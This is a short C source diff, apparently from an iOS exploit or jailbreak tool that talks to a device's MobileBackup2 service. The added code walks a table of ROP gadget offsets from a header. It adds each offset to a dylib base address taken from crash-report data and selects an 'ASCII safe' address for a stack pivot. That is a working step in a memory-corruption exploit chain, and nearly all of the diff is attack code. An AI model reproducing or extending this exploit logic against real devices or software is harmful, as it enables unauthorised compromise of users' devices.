@@ -26,6 +26,8 @@
 #include "device.h"
 #include "crashreporter.h"
 
+#include "offsets.h"
+
 #ifdef WIN32
 #define sleep(x) Sleep(x*1000)
 #endif
@@ -98,6 +100,31 @@ int main(int argc, char* argv[]) {
 	if (mb2 == NULL) {
 		error("Unable to open connection to MobileBackup2 service\n");
 		device_free(device);
+		return -1;
+	}
+
+	int i = 0;
+	int found = 0;
+	unsigned int address = 0;
+	// Loop through each ROP gadget for this firmware and find one in a nice ascii
+	//  safe address for our stack pivot
+	for(i = 0; offsets[i].offset != 0; i++){
+		address = crash->dylibs[2]->offset + offsets[i].offset;
+		if((address & 0x80808080) == 0
+				&& (address & 0x7F000000) != 0
+				&& (address & 0x007F0000) != 0
+				&& (address & 0x00007F00) != 0
+				&& (address & 0x0000007F) != 0) {
+			found = 1;
+			break;
+		}
+	}
+
+	if(found) {
+		info("Usable ASCII safe gadget address found at 0x%08x\n", address);
+
+	} else {
+		error("Unable to find ASCII safe gadget address for stack pivot\n");
 		return -1;
 	}
 
